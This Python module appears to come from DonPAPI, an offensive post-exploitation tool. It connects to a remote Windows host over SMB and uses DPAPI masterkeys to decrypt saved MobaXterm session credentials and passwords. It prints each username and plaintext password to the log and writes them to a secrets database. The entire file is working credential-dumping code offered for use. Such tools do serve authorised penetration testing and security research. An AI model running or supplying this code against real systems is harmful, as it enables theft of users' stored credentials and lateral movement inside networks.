from typing import Any
from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection
from dploot.triage.mobaxterm import MobaXtermTriage, MobaXtermCredential, MobaXtermPassword
from donpapi.core import DonPAPICore
from donpapi.lib.logger import DonPAPIAdapter

TAG = "MobaXterm"

class MobaXtermDump:
    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list, options: Any, logger: DonPAPIAdapter, context: DonPAPICore) -> None:
        self.target = target
        self.conn = conn
        self.masterkeys = masterkeys
        self.options = options
        self.logger = logger
        self.context = context

    def run(self):
        if self.context.remoteops_allowed:
            self.logger.display("Dumping MobaXterm credentials")
            mobaxterm_triage = MobaXtermTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys)
            try:
                _, credentials = mobaxterm_triage.triage_mobaxterm()
                for credential in credentials:
                    if isinstance(credential, MobaXtermCredential):
                        self.logger.secret(f"[Credential] [{credential.winuser}] {credential.name} - {credential.username}:{credential.password.decode('latin-1')}", TAG)
                        self.context.db.add_secret(computer=self.context.host, collector=TAG, windows_user=credential.winuser, program=TAG, username=credential.username, password=credential.password.decode('latin-1'))
                    elif isinstance(credential, MobaXtermPassword):
                        self.logger.secret(f"[Password] [{credential.winuser}] {credential.username}:{credential.password.decode('latin-1')}", TAG) 
                        self.context.db.add_secret(computer=self.context.host, collector=TAG, windows_user=credential.winuser, program=TAG, username=credential.username, password=credential.password.decode('latin-1'))
            except Exception as e:
                if "ERROR_FILE_NOT_FOUND" not in str(e):
                    self.logger.error(f"Error while dumping mobaxterm: {e}")